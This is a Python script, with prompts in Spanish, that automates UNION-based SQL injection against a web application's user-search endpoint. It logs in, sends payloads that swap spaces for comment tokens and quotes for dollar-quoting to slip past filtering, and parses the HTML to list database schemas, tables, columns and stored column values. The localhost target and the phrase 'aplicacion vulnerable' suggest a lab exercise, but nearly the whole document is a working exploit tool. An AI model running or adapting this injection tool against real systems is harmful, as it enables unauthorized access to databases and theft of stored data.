import requests
from bs4 import BeautifulSoup

def login(username,password):
	session = requests.Session()
	body = {"username":f"{username}","password":f"{password}"}
	session.post(f'http://localhost:8000/login',data=body)
	token = session.cookies.get_dict()['auth']
	return token

def enumerate(payload_parcial,entrada,token):
	array_i = []
	payload_completo = "t12'" + ((f"{payload_parcial}").replace(" ","/**/")).replace("'","$$") 
	headers = {"Cookie":f"auth={token}"}
	respuesta = requests.get(f'http://localhost:8000/find-user?u={payload_completo}',headers = headers)
	soup = BeautifulSoup(respuesta.text,"html.parser")
	resultados = soup.find_all('span', style="color: white; text-decoration:underline; font-weight: bold")
	for i in resultados:
		array_i.append(i.text)
	secuencia = ' , '.join(array_i)
	if entrada == 'S':
		print(f"Los schemas de la base de datos son: {secuencia}")
	if entrada == 'T':
		print(f"Las tablas de la base de datos son: {secuencia}")
	if entrada == 'C':
		print(f"Las columnas de la tabla son: {secuencia}")
	if entrada == "V":
		print(f"Los valores almacenados en la columna son: {secuencia}")


credenciales = input("Digite el username y password de su cuenta en la aplicacion vulnerable. Ademas, deben ir separados por comas y en el orden descrito: ")
argumentos_0 = credenciales.split(',')

while(True):
	entrada = input("Digite S si desea enumerar los schemas de la bases de datos actual.\n\rDigite T si desea enumerar las tablas de las bases de datos (que son diferentes a las predeterminadas).\n\rDigite C si desea enumerar las columnas de una tabla.\n\rDigite V si desea conocer el valor almacenado en una o varias columnas.\n\rDigite 'exit' si desea terminar la ejecucion de este programa.\n\rDigite su entrada: ")
	if entrada == 'S':
		variable_A = " UNION SELECT null,null,null,null,schema_name,null FROM information_schema.schemata--"
		enumerate(variable_A,entrada,login(argumentos_0[0],argumentos_0[1]))
	if entrada == 'T':
		entrada_2 = input("Digite el nombre del schema del que desea enumerar sus tablas: ")
		variable_B = f" UNION SELECT null,null,null,null,table_name,null FROM information_schema.tables where table_schema = '{entrada_2}'--"
		enumerate(variable_B,entrada,login(argumentos_0[0],argumentos_0[1]))
	if entrada == 'C':
		entrada_3 = input("Digite el nombre de la tabla y el schema al que pertenece dicha tabla con el fin de saber el nombre de las columnas de la tabla. Ademas, debe digitarlos separados por una coma y en el orden descrito: ")
		argumentos = entrada_3.split(',')
		variable_C = f" UNION SELECT null,null,null,null,column_name,null FROM information_schema.columns WHERE table_name = '{argumentos[0]}' AND table_schema = '{argumentos[1]}'--" 
		enumerate(variable_C,entrada,login(argumentos_0[0],argumentos_0[1]))
	if entrada == 'V':
		entrada_4 = input("Digite el nombre de tabla de la(s) columnas(s). Ademas, debe digitarlos separados por comas y en el orden descrito: ")
		argumentos = entrada_4.split(',')
		tabla_name = argumentos[0]
		del argumentos[0]
		for i in (argumentos):
			variable_D = f" UNION SELECT null,null,null,null,{i},null FROM {tabla_name}--"
			enumerate(variable_D,entrada,login(argumentos_0[0],argumentos_0[1]))
	if entrada == "exit":
		break
